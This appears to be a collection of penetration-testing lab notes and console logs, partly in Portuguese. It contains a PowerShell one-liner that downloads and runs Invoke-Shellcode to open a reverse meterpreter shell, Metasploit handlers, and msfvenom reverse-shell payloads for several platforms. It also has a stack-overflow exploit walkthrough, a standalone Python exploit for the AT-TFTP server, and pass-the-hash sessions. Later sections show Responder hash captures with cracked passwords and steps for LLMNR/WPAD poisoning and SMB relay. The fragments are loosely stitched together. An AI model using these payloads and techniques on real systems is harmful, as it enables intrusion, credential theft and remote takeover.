set payload windows/meterpreter/reverse_https
set LHOST 192.168.153.164
set LPORT 4443
set EXITFUNC thread
exploit -j
 
 
 
sessions -i 1
shell
powershell -command "IEX (New-Object Net.WebClient).DownloadString('https://s3.amazonaws.com/StrategicSec-Files/Powersploit/Invoke-Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.153.164 -Lport 4443 -Force"
 
 
####################################
# Socks Tunneling with Proxychains #
####################################
--- Open a duplicate putty session to your Ubuntu host

sudo apt-get install -y proxychains
	strategicsec

sudo vi /etc/proxychains.conf                           <--- Make sure that last line of the file is: socks4  127.0.0.1 1080
 
        Comment out the proxy_dns, change the 9050 (tor port) to the metasploit socks proxy port (1080) and save it.
        socks4  127.0.0.1 1080
 
***************************Set up a Socks Proxy through your Pivot *************************
 
 
use auxiliary/server/socks4a
 
set SRVHOST 127.0.0.1
 
set SRVPORT 1080
 
run
 
        --- Go back to your other putty session with the meterpreter shell
cd ~
 
proxychains nmap -sT -PN -vv -sV --script=smb-os-discovery.nse -p 445 192.168.153.0/24          <--- This is going to be really slow
 
proxychains nmap -sT -PN -n -sV -p 21,22,23,25,80,110,139,443,1433,1521,3306,3389,8080,10000 192.168.153.0/24           <--- This is going to be really slow
 
 
        ---close the duplicate putty session to your Ubuntu host




##################
# Day 2 Homework #
##################
Please take screenshots of you doing videos 11-20 in this playlist
https://www.youtube.com/playlist?list=PL1512BD72E7C9FFCA

Please take screenshots of you doing all of the steps in section 3 of this pastebin

##################################
# Section 4: Exploit Development #
##################################

###############################################
# Chapter 9: Porting an exploit to Metasploit #
###############################################

***********************************************
* Vulnerable Server Versus Fuzzer and Company *
***********************************************


- Inside of your Windows7 VM - download the following file to the Desktop:
https://s3.amazonaws.com/StrategicSec-Files/SimpleExploitLab.zip
 
- Extract this zip file to your Desktop
 
- Go to folder C:\Users\Workshop\Desktop\ExploitLab\2-VulnServer, and run vulnserv.exe
 
- Open a new command prompt and type:
nc localhost 9999
 
- In the new command prompt window where you ran nc type:
HELP
 
- Go to folder C:\Users\Workshop\Desktop\ExploitLab\4-AttackScripts
- Right-click on 1-simplefuzzer.py and choose the option edit with notepad++
 
- Now double-click on 1-simplefuzzer.py
- You'll notice that vulnserv.exe crashes. Be sure to note what command and the number of As it crashed on.
 
 
- Restart vulnserv, and run 1-simplefuzzer.py again. Be sure to note what command and the number of As it crashed 

on.
 
- Now go to folder C:\Users\Workshop\Desktop\ExploitLab\3-OllyDBG and start OllyDBG. Choose 'File' -> 'Attach' and 

attach to process vulnserv.exe
 
- Go back to folder C:\Users\Workshop\Desktop\ExploitLab\4-AttackScripts and double-click on 1-simplefuzzer.py.
 
- Take note of the registers (EAX, ESP, EBP, EIP) that have been overwritten with As (41s).
 
- Now isolate the crash by restarting your debugger and running script 2-3000chars.py
 
- Calculate the distance to EIP by running script 3-3000chars.py
- This script sends 3000 nonrepeating chars to vulserv.exe and populates EIP with the value: 396F4338
 
4-count-chars-to-EIP.py
- In the previous script we see that EIP is overwritten with 396F4338 is 8 (38), C (43), o (6F), 9 (39)
- so we search for 8Co9 in the string of nonrepeating chars and count the distance to it
 
5-2006char-eip-check.py
- In this script we check to see if our math is correct in our calculation of the distance to EIP by overwriting EIP 

with 42424242
 
6-jmp-esp.py
- In this script we overwrite EIP with a JMP ESP (6250AF11) inside of essfunc.dll
 
7-first-exploit
- In this script we actually do the stack overflow and launch a bind shell on port 4444
 
8 - Take a look at the file vulnserv.rb and place it in your Ubuntu host via SCP or copy it and paste the code into 

the host.
 
 
------------------------------
 
cd /home/strategicsec/toolz/metasploit/modules/exploits/windows/misc
 
vi vulnserv.rb
 
 
 
cd ~/toolz/metasploit
 
./msfconsole
 
 
 
use exploit/windows/misc/vulnserv
set PAYLOAD windows/meterpreter/bind_tcp
set RHOST 192.168.153.163
set RPORT 9999
exploit







#########################################
# Chapter 12: Shellcoding with MSFVenom #
#########################################


-No shellcoding walk-through can be considered complete without covering Metasploit’s MSFPayload replacement 
msfvenom. 

-If you have never used msfvenom, the first thing you should do is read the help menu and memorize some of these 
flags:

-Example 1: If you wish to list all the payloads available, you can do the following (also the same for listing 
encoders, nops, or all):

./msfvenom -l payloads  


- Example 2: Generating a windows/meterpreter/reverse_tcp:
./msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP -f exe


- Example 3: To generate a payload that avoids certain bad characters:
./msfvenom -p windows/meterpreter/bind_tcp -b '\x00'  msfv


- Example 4: To generate a payload with a specific encoder, and then encode 3 times:
./msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3  

-Example 5: Inject a payload to calc.exe, and save it as new.exe

./msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -k -f exe > new.exe  



- msfvenom is a combination of Msfpayload and Msfencode, putting both of these tools into a single Framework instance. 

-Note: msfvenom has replaced both msfpayload and msfencode as of June 8th, 2015.

-The advantages of msfvenom are:
One single tool
Standardized command line options
Increased speed
Msfvenom has a wide range of options available:

-MSFvenom command line usage
-You can see an example of the msfvenom command line below and its output:
-The msfvenom command and resulting shellcode above generates a Windows bind shell with three iterations of the 

-shikata_ga_nai encoder without any null bytes and in the python format.



-Here is a list of available formats that you can use

-MSFvenom options and uses

msfvenom -v or –var-name

-Usage: -v, –var-name <name>
-Specify a custom variable name to use for certain output formats. Assigning a name will change the output’s variable 

-from the default “buf” to whatever word you supplied.
-Default output example:



msfvenom -n, –nopsled

-You will occasionally need to add a few NOPs at the start of your payload. This will place a nopsled of [length] 
size at the beginning of your payload.

msfvenom –smallest

-If the “smallest” switch is used, msfvenom will attempt to create the smallest shellcode possible using the
selected encoder and payload.

msfvenom -c, –add-code

-Specify an additional win32 shellcode file to include, essentially creating a two (2) or more payloads in one (1) 
shellcode.

-Payload #1:

-Adding payload #2:

-Adding payload #3:

-Running the “cookies.exe” file will execute both message box payloads, as well as the bindshell using default 
settings (port 4444).

msfvenom -x, –template & -k, –keep

-The -x, or –template, option is used to specify an existing executable to use as a template when creating your 
executable payload.
-Using the -k, or –keep option in conjunction will preserve the template’s normal behavior and have your injected 
payload run as a separate thread.

- Creating Metasploit Payloads

-Often one of the most useful (and to the beginner underrated) abilities of Metasploit is the msfpayload module. 
Multiple payloads can be created with this module and it helps something that can give you a shell in almost any 
situation. For each of these payloads, you can go into msfconsole and select exploit/multi/handler. Run ‘set 
payload’ for the relevant payload used and configure all necessary options (LHOST, LPORT, etc). Execute and wait for 
the payload to be run. For the examples below it’s pretty self explanatory but LHOST should be filled in with your 
IP address (LAN IP if attacking within the network, WAN IP if attacking across the internet), and LPORT should be 
the port you wish to be connected back on.

- List payloads

msfvenom -l

- Binaries

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.153.164 LPORT=4444 -f elf > shell.elf

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.153.164 LPORT=4444 -f exe > shell.exe

- Mac
msfvenom -p osx/x86/shell_reverse_tcp LHOST=192.168.153.164 LPORT=7777 -f macho > shell.macho

- PHP

msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.153.164 LPORT=7777 -f raw  > shell.php


Scripting Payloads
- Python
msfvenom -p cmd/unix/reverse_python LHOST=192.168.153.164 LPORT=4444 -f raw > shell.py


- Bash
msfvenom -p cmd/unix/reverse_bash LHOST=192.168.153.164 LPORT=4444 -f raw > shell.sh


- Perl
msfvenom -p cmd/unix/reverse_perl LHOST=192.168.153.164 LPORT=4444 -f raw > shell.pl

-Shellcode

-For all shellcode options see ‘msfvenom –help-formats’ for information as to valid parameters. Msfvenom will output 
code that is able to be cut and pasted in this language for your exploits.

- Linux Based Shellcode
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.153.164 LPORT=7777 -f python

- Windows Based Shellcode
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.153.164 LPORT=7777 -f python

- Mac Based Shellcode
msfvenom -p osx/x86/shell_reverse_tcp LHOST=192.168.153.164 LPORT=4444 -f python

-Handlers
-Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming 
shells. Handlers should be in the following format.

use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.153.164
set LPORT 4444
set ExitOnSession false
exploit -j

-Once the required values are completed the following command will execute your handler – ‘msfconsole -L -r ‘





#######################################################################
# Chapter 13: Converting Metasploit Exploits to a Stand Alone Exploit #
#######################################################################



Sometimes you might want to have a stand alone exploit, but the only option out there is a Metasploit module. Sure 
you could always just fire up Metasploit and use it… but what fun would that be? Besides it’s great to understand 
what’s going on under the hood of the Metasploit modules for both getting a handle on writing your own exploits and 
in the future even writing your own Metasploit modules and contributing back to the fantastic project.
Requirements

●     Windows XP – SP3 Virtual Machine (Victim).
●     StrategicSec Virtual Machine (Attacker).
●     Allied Telesyn TFTP Server 1.9 (Available here:   http://netsec.ws/wp-content/downloads/at-tftpd19.exe).
●     A willingness to give things a go.


-The Target

-We’re going to be adapting the attftp_long_filename.rb module located at 
-/home/strategicsec/toolz/metasploit/modules/exploits/windows/tftp/attftp_long_filename.rb and changing it into our 
own stand alone Python exploit. I’m by no means an experienced exploit writer so this is something that I’ve hacked 
together and figured out myself, there may be more optimal ways of doing each step. Full credit must be given to 
‘patrick’ the original author of the module along with prop’s to c0re since we’re pulling out his return address.
attftp_long_filename.rb


-Key Points

-Let’s run through some key points of the module and try and understand it a little better. Only parts that have an 
impact on our exploit will be examined.


-Default Exit Options

-As noted above, the default exit function is ‘process’. This the method in which the shellcode will exit after 
running and typically has an impact on how stable the vulnerable program will be after we send our exploit. This 
value should be noted for when we alter the shellcode used to suit our particular situation.

-Payload


-The payload is one of the key aspects we need to examine. This states that we have 210 bytes of space for our 
payload to reside in. Any larger and we may possibly run into issues of corruption or truncation of our exploit. Bad 
characters signify bytes that may impact our exploit. We need to ensure none of these characters are in our 
shellcode, and in this case it’s the almost universally bad null character ‘0x00′. For more information on bad 
characters search this site for writing basic buffer overflows. Finally, we see something called stack adjustment. 
Essentially because we’re so restricted in space we need to utilize something called a staged payload. What we’re 
doing is only sending a small first instruction which is designed to connect back to us and get the main payload, 
which wouldn’t regularly fit. Because of this we need to adjust the stack pointer back 3500 bytes so it has room to 
actually write the payload without overwriting itself.

-Targets


-Metasploit has a wide variety of targets for many exploits, which really is mostly a wide variety of suitable return 
addresses for each operating system. Because they are often using system DLLs, these addresses are not changed from 
computer to computer and ensures exploit compatibility. In our case, we wish to use the return address donated by 
c0re, Windows XP SP3.


-The Exploit


-The main part all the rest has been leading up to, the exploit itself. Let’s go through it line by line to ensure we 
understand.

-connect_udp



-This signifies that the exploit will be sent over UDP packets. This line connects sets the target as the values in 

-Metasploit such as RHOST and RPORT.

-sploit = "\x00\x02" +....

-The exploit is started with two hex values, ‘0x00′ and ‘0x02′ followed by a series of NOPs. The nops component is going to be variable in length depending on the length of your LAN IP, but always totaling 25 in total. As an example the LHOST value of ‘192.168.1.2’ has a length of 11, while an IP address of ‘192.168.100.123’ has a length of 15. If you want to play around with this fire up IRB (Interactive Ruby Shell) and assign a variable such as LHOST = ‘192.168.1.50’. The command LHOST.length will then tell you the length value – or just count how many characters 
there are including periods.

-sploit << payload.encoded



-This line encodes the payload specified within Metasploit and encodes it in the required format. Metasploit will internally determine what payloads are suitable given the space available and the target operating system, and they can be viewed with the ‘show payloads’ command. When we say ‘required format’ it means that it will exclude the nominated bad characters earlier in the exploit.


-sploit << [target['RET']].pack('V')


-This command will append the target return address into the exploit string. It’s presented as a variable here because within Metasploit you can nominate different operating systems, but for our purposes it will just be the Windows XP SP3 return address. The pack ‘V’ command signifies that it needs to be packed in little endian format, necessary for x86 processors.

-sploit << "x88\xc4\x28\xc3"

-Translated into commands, this is instructing the esp register to add 40 bytes and return. Necessary to position esp correctly for our exploit.

-sploit<< "\x00" + "netascii" + ...

-The final string of our exploit, this terminates the data stream in a format AT-TFTP is expecting.
-udp_sock.put(sploit)


-This instructs Metasploit to send the exploit via UDP.

disconnect_udp


-Self-explanatory but this signifies it has finished with the UDP socket.
-Adapting Each Part

-Let’s summarize what we need to achieve in our own exploit for it to get working based on the above, highlighted 
areas.
●     Create an appropriately sized NOP sled based off the size of LHOST
●     Nominate the return address and pack it in little endian format
●     Generate shellcode suitable for our situation (LHOST, etc)
●     Perform stack adjustment on the shellcode so our second stage can write correctly
●     Send the exploit over UDP with Python

About the only step in there which should sound a little challenging is this stack adjustment business, but really as with all things it’s a lot easier than it sounds.

-Let’s begin with a very bare bones UDP framework for sending information to the target.

#nano at-tftp.py
# AT-TFTP v1.9 Exploit
# Written for Strategic Security
import sys, socket
# Use in the form "python attftp_long_filename.py <IP Address> <Port> <Your IP Address>"
host = sys.argv[1]                        	# Receive IP from user
port = int(sys.argv[2])                	# Receive Port from user
exploit = ""                                     	# Out future exploit location
client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # Declare a UDP socket
client.sendto(exploit, (host, port))                                                      	# Send the exploit 

over UDP to the nominated addresses



-Now from here a lot of the information is going to be straight translations from the ruby counterparts. This includes creating the appropriate sized NOPs and the return address, along with the information we know will be sent to set up the exploit itself. Let’s incorporate that into our framework.

# AT-TFTP v1.9 Exploit
# Written for Strategic Security
import sys, socket

# Use in the form "python attftp_long_filename.py <Target IP Address> <Port> <Your IP

Address>"
host = sys.argv[1]                        	# Receive IP from user
lhost = sys.argv[3]
port = int(sys.argv[2])                	# Receive Port from user
ret = "\x53\x93\x42\x7e"         	# Return address - Source Metasploit (Little Endian)
nop = "\x90" * (25-len(lhost))	# Create a NOP string as to bring NOPs + LHOST up to 25 bytes
payload = ""                                   	# Payload to be calculated
exploit = "\x00\x02" + nop + payload + ret + "\x83\xc4\x28\xc3\x00netascii\x00"  	# Our exploit so far
client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # Declare a UDP socket
client.sendto(exploit, (host, port))         	# Send the exploit over UDP to the nominated
addresses




-Now we’ve got the known information we need to take the next step and factor in the stack adjustment for our staged payload.


-Stack Adjustment

-First we need to dump our payload into a raw hex file for further manipulation. Our payload, in this case, is going to be the meterpreter shell windows/meterpreter/reverse_nonx_tcp, chosen for it’s particularly small code footprint. 

-We use the command,

./msfvenom -p windows/meterpreter/reverse_nonx_tcp LHOST=192.168.153.164 LPORT=4443 -a Windows -a x86 -o payload



-If we wish to confirm this has successfully outputted to the file we can use the command

#hexdump -C payload


-This will also come in handy when comparing the file against the post stack adjustment version. Next we need to find out what command we actually need to use to adjust the stack -3500 bytes.
This can be done using the Metasploit tool nasm_shell.rb, located here

/usr/share/metasploit-framework/tools/nasm_shell.rb.

-Putting in an assembly command will give you the hex machine instruction for that command. Since we want to subtract 3500 (0xDAC in hex) from the stack pointer we do the following,
Install nasm before proceeding to the next command

#sudo apt-get install nasm
#ruby /home/strategicsec/toolz/metasploit/tools/nasm_shell.rb
nasm > sub esp, 0xDAC
00000000  81ECAC0D0000  	sub esp,0xdac



-This tells us we need to use the commands 81EC AC0D 0000 to achieve adjusting the stack by 3500. We output this into a raw hex file. You can do it however you wish, such as with a hex editor, but a quick one line example with Perl is as follows,

#perl -e 'print "\x81\xec\xac\x0d\x00\x00"' > stackadj

-We now have two raw files - stackadj and our payload. We want to combine them both together which is a simple cat command,

#cat stackadj payload > shellcode

-To confirm we now have the file in a correct format we once more examine it with hexdump and compare it against our previous dump.

# hexdump -C shellcode



-It’s exactly the same as our past payload but with the stack adjustment having taken place at the start of the exploit. We’re almost done now, but we have one final step we need to do to the shellcode.

Encoding Shellcode

-In both our stack adjustment command and the payload itself, there are null characters which we need to remove. Msfencode comes to our rescue once again and we can reencode the payload without nulls.

strategicsec@ubuntu:~/toolz/metasploit$ cat shellcode | sudo ./msfvenom -b '\x00' -e x86/shikata_ga_nai -a x86 --platform win -f python



We can now cut and paste this shellcode into our python exploit. The final exploits look like the below.

Final Stand Alone Exploit





Running the Exploit


- Let’s test this against our Windows XP victim. Install AT-TFTP v1.9 from the link in the requirements. Ensure you unblock any firewall prompts to allow access. Because this is a staged payload, we need to set up Metasploit to catch the incoming shell. It will then send the second much larger buffer (770048 bytes) that we could never have fit into our exploit itself. Run the commands sequentially,

#msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_nonx_tcp
set LHOST 192.168.153.164
set LPORT 4443
exploit


- Now the fun stuff, we run the command,

# python at-tftp.py 192.168.153.164 69 192.168.153.163

- It goes without saying you should put in your own IP values, but it should maintain the format python. All going well, this is the result…


Congratulations, you’ve successfully modified your first Metasploit module into a standalone exploit.




-=-=-=-=-=-=-=-=-=-



-=[ Prayer to Computer Angel ]=-   3/97
  _____________                              ________
 |.-----------.|                            | ______o|
 ||     _     ||                            ||__---_||
 ||   (\o/)   ||                            | ______ |
 ||    /_\    ||                            ||______||
 ||___________||                            |--------|
  `-)-------(-'                             |      O |
  [=== -- o ]--.                            |      | |
 __'---------'__ \                          |      | |
[::::::::::: :::] )                         |      | |
 `""'"""""'""""`/T\                         |::::::::|
                \_/                         
				
0;196591  Kerberos   HOW2SEC       welltom          lm{921988ba001dc8e1c295285c92cd06b4 }, ntlm{ 25accfc9cdecc45a3029075fc13afc36 } => 921988ba001dc8e1c295285c92cd06b4:25accfc9cdecc45a3029075fc13afc36

root@kali-wellx64:~/devel# pth-winexe -U administrator%aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42 //192.168.5.129 cmd.exe
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>exit
exit
root@kali-wellx64:~/devel# pth-winexe -U administrator%aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42 //192.168.5.136 cmd.exe
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>exit
exit
root@kali-wellx64:~/devel#

root@kali-wellx64:~/devel# pth-winexe -U administrator%aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42 //192.168.5.136 cmd.exe
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>exit
exit
root@kali-wellx64:~/devel#

root@kali-wellx64:~/devel# pth-winexe -U how2sec/welltom%921988ba001dc8e1c295285c92cd06b4:25accfc9cdecc45a3029075fc13afc36 //192.168.5.136 cmd.exe
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>exit
exit
root@kali-wellx64:~/devel#





-=-=-=-=-=-=-=-=-=-=-=-=


[SMB] NTLMv2-SSP Hash     	: oteb.02::HOW2SEC:1122334455667788:F87ED04267CDFA282BD9F2A524D11A01:01010000000000001D65B6B055DBD201C686697C8F7E1E0E0000000002000A0053004D0042003100320001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D00420031003200080030003000000000000000000000000020000042F34917142979EB0C15F2D2CA96ED11F0DE11B3850A6883B803C7123D6DFDC30A001000000000000000000000000000000000000900180063006900660073002F00770069006E0031003200700073000000000000000000
[HTTP] NTLMv2 Hash     		: oteb
[HTTP] NTLMv2 Hash     		: oteb
[SMB] NTLMv2-SSP Hash     	: maloy.03::HOW2SEC:1122334455667788:7785BF1C5B172B87E8A6D8AFEEFD5449:01010000000000005A9C1ADD56DBD201BC8E0616918A6B920000000002000A0053004D0042003100320001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D004200310032000800300030000000000000000100000000200000FFD0A75CC591D195DD6A447F2871F6760FF4432CDB692BFA7B02E6AE8A75C9050A001000000000000000000000000000000000000900160063006900660073002F00770069006E003100500053000000000000000000
[HTTP] NTLMv2 Hash     		: maloy
[SMB] NTLMv2-SSP Client     : Administrator::HOW2SEC:1122334455667788:A638E93049C9E5C6DCB1FF6C63B2A826:0101000000000000552B1C4558DBD20189237E140DD24CCF0000000002000A0053004D0042003100320001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D00420031003200080030003000000000000000000000000030000078CD735D4623F20B42E47489E8F7D0A34761AC031E4FD8E42075F5DCE510E6870A001000000000000000000000000000000000000900140063006900660073002F00770069006E00310036000000000000000000
[SMB] Requested Share     	: Administrator
[SMB] NTLMv2 Hash     		: Administrator::HOW2SEC:1122334455667788:A4C64B7308E82ECF507F6327E0BA2C4D:010100000000000004D88CB058DBD20132B870732C7A689100000000020000000000000000000000
[SMB] NTLMv2 Hash    	 	: maloy.03::HOW2SEC:1122334455667788:F1D623AC685225E85A49F5FBAA6F7229:010100000000000004ACAED658DBD201082743A3157FBBA400000000020000000000000000000000
[HTTP] NTLMv1 Hash     		: welltom::WINXP:536BD7E1848CFCD400000000000000000000000000000000:2BCC7B38090D00A5075D7482D03F69D6C5AFF7982DD16095:1122334455667788
[HTTP] Basic Client   		: 192.168.5.136
[HTTP] Basic Username 		: welltom
[HTTP] Basic Password 		: P@ssw0rd01

https://github.com/CoreSecurity/impacket

root@kali-wellx64:/opt/well-tools/Responder/logs# john --wordlist=/opt/well-tools/wordlists/wordlist02.txt HTTP-NTLMv2-192.168.5.135.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
P@ssw0rd02       (oteb.02)
1g 0:00:00:00 DONE (2017-06-03 12:39) 2.222g/s 447295p/s 447295c/s 447295C/s P@ssw0rd02
Use the "--show" option to display all of the cracked passwords reliably
Session completed

root@kali-wellx64:/opt/well-tools/Responder/logs# john --wordlist=/opt/well-tools/wordlists/wordlist02.txt SMB-NTLMv2-SSP-192.168.5.135.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
P@ssw0rd02       (oteb.02)
1g 0:00:00:00 DONE (2017-06-03 12:40) 2.564g/s 516110p/s 516110c/s 516110C/s P@ssw0rd02
Use the "--show" option to display all of the cracked passwords reliably
Session completed

root@kali-wellx64:/opt/well-tools/Responder/logs# john --wordlist=/opt/well-tools/wordlists/wordlist02.txt HTTP-NTLMv2-192.168.5.129.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
P@ssw0rd03       (maloy.03)
1g 0:00:00:00 DONE (2017-06-03 12:40) 2.173g/s 437573p/s 437573c/s 437573C/s P@ssw0rd03
Use the "--show" option to display all of the cracked passwords reliably
Session completed

root@kali-wellx64:/opt/well-tools/Responder/logs# john --wordlist=/opt/well-tools/wordlists/wordlist02.txt SMB-NTLMv2-192.168.5.129.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
P@ssw0rd03       (maloy.03)
1g 0:00:00:00 DONE (2017-06-03 12:41) 3.030g/s 609951p/s 609951c/s 609951C/s P@ssw0rd03
Use the "--show" option to display all of the cracked passwords reliably
Session completed

root@kali-wellx64:/opt/well-tools/Responder/logs# john --wordlist=/opt/well-tools/wordlists/wordlist02.txt SMB-NTLMv2-SSP-192.168.5.129.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
P@ssw0rd03       (maloy.03)
1g 0:00:00:00 DONE (2017-06-03 12:41) 1.612g/s 324651p/s 324651c/s 324651C/s P@ssw0rd03
Use the "--show" option to display all of the cracked passwords reliably
Session completed

root@kali-wellx64:/opt/well-tools/Responder/logs# john --wordlist=/opt/well-tools/wordlists/wordlist02.txt HTTP-NTLMv1-192.168.5.136.txt
Warning: detected hash type "netntlm", but the string is also recognized as "netntlm-naive"
Use the "--format=netntlm-naive" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (netntlm, NTLMv1 C/R [MD4 DES (ESS MD5) 128/128 AVX 4x3])
Press 'q' or Ctrl-C to abort, almost any other key for status
P@ssw0rd01       (welltom)
1g 0:00:00:00 DONE (2017-06-03 12:42) 16.66g/s 3355Kp/s 3355Kc/s 3355KC/s zumvt..м&
Use the "--show" option to display all of the cracked passwords reliably
Session completed

root@kali-wellx64:/opt/well-tools/Responder/logs# john --wordlist=/opt/well-tools/wordlists/wordlist02.txt SMB-NTLMv2-192.168.5.133.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
P@ssw0rd         (Administrator)
1g 0:00:00:00 DONE (2017-06-03 12:43) 3.030g/s 474757p/s 474757c/s 474757C/s P@ssw0rd
Use the "--show" option to display all of the cracked passwords reliably
Session completed

root@kali-wellx64:/opt/well-tools/Responder/logs# 




-=-=-=-=-=-=-=-=-



Pen-test Infra
==============
root@kali-wellx64:/opt/well-tools# git clone https://github.com/m8r0wn/nullinux
Cloning into 'nullinux'...
remote: Counting objects: 141, done.
remote: Total 141 (delta 0), reused 0 (delta 0), pack-reused 141
Receiving objects: 100% (141/141), 26.56 KiB | 0 bytes/s, done.
Resolving deltas: 100% (83/83), done.

root@kali-wellx64:/opt/well-tools# ls
nullinux  Pen-Test  Responder  SimpleHTTPServer  wordlists

root@kali-wellx64:/opt/well-tools# cd nullinux/

root@kali-wellx64:/opt/well-tools/nullinux# ls
LICENSE  nullinux.py  README.md  usage.txt

root@kali-wellx64:/opt/well-tools/nullinux# ls ../wordlists/
wordlist-leak01.txt  wordlist-leak1.txt

root@kali-wellx64:/opt/well-tools/nullinux# 

Depois rodamos o Responder para coletar credenciais.

Depois de conseguir alguma credencial (pode ser qualquer uma que logue no domnio), iremos utilizar a 
ferramenta enum4linux para enumerar o domínio.

Extract all machine usernames (accounts with $ on the username, like: user$)
Nmap all those userX$.domain.name to get their IP address and open ports. Repeat the nmap process in all 
different subnets

com isso, iremos pegar máquina de várias redes (o maior numero de máquinas possivel) e devemos mapear 
todas elas.

Ainda assim você não conseguiu boas respostas com as tentativas acima. Partimos para:

Indentify "live subnets"

Não é preciso scanear todos os IP para identificar as subredes aivas
 vamos escanear apenas endereços IP e portas conhecidas para identificar endereços ativos nas subredes
 endereços ip final: x.x.x.1, x.x.x.10, x.x.x.100, x.x.x.101, x.x.x.192, x.x.x.150, x.x.x.200, x.x.x.250, 
 x.x.x.201, x.x.x.253 e x.x.x.254
 as portas: 21, 22, 23, 25, 53, 80, 443, 445 8080, 3128, e 3389
Vamos utilizar para mapear o nmap mas tunado, ele é extremamente rápido, porém barulhento.
nmap -A -T4 -n -top-ports 1000 --max-rtt-timeout=500ms --initial-rtt-timeout=200ms --min-rtt-timeout=200ms 
--open --stats-every 5ss x.x.x.0/24

O que é LLMNR and NBT-NS Poisoning

testar o comando:
. Responder.py -I eth0 -rPv
. john or hashcat

o protocolo WPAD é o protocolo básico do Internet Explorer para perguntar quem é o proxy na rede.
Se ele tentar acessar alguma coisa em http você irá pegar as credenciais em clean-text

Responder + Proxenet By @Hugsy
https://proxenet.readthedocs.io/en/dev//mitm/
. Use Responder to spoof NetBIOS packets and poison local network Windows workstation WPAD configuration, and 
redirect traffic to our evil box.
. Add the plugin oPhishPoison.py to the autoload directory of proxenet and start it.eplace know 
    . ln -sf proxenet-plugins/oPhishPoison.py proxenet-plugins/oPhishPoison.py
	. ./proxenet -b YOU_IP -p 8008 -i -NBT-N
. From the moment proxenet and Responder are configured and running, fake LLMNR and WPAD responses will be
sent to the victims. By default, the loaded plugin will replace know binary content type (such as office document, zip files, rar archives, etc.) 
with PE Executables containing you payloads.
. Please visit the link for detailed configuration.

Essas tools faz igual ao The Backdoor Factory (TbF)
https://github.com/secretsquirrel/the-backdoor-factory

Pass-The-Hash
https://github.com/byt3bl33d3r/pth-toolkit
https://github.com/Kevin-Robertson/Invoke-TheHash
https://github.com/SpiderLabs/Responder/blob/master/tools/SMBRelay.py

Responder + MultiRelay
Foi implementado o SMBRelay no Responser

MultiRelay was bult to work in conjunction with Responser.py, the common usage scenario is:
  .  Set SMB and HTTP to Off in Responder.conf
  .  ./Response.py -I eth0 -rv (on one screen)
  .  ./tools/MultiRelay -t Target_IP -u Administator DAaccount OtherAdmin (on another screen).

o MultiRelay trocou de nome e se chama SMBRelay.py

GPO (Group Policies)
====================

Após ter uma credencial podemos entrar no diret´porio onte temos todos os scripts de GPO
\\<domain Controller>\SYSVOL\<Domain_Name>\Policies\
Contém todos os scripts de login, politica de grupos e outros dados necessários para o controlador de dominio
Ele pode ser acessado por qualquer usuário com login no AD
Podemos encontrar credenciais em hard-coded.


GPP (Group Policy Preferences)
A partir da versão Windows Server 2008
Ele é utilizado para armazenar credenciais para ser utilizado nas tarefas de: trocar a senha dos usuários admin locais
, configurações de impressoras, configuração de compartilhamentos, configurações de servidores, etc.
Essas credenciais estão encryptadas em AES-256. Só que a Microsoft disponibiliza a chave no site dela

https://msdn.microsoft.com/em-us/library/cc422924.aspx
2.2.1.1.4 Password Encryption
2.2.1.1.4 Password Encryption

All passwords are encrypted using a derived Advanced Encryption Standard (AES) key. <3>

The 32-byte AES key is as follows:

     4e 99 06 e8  fc b6 6c c9  fa f4 93 10  62 0f fe e8
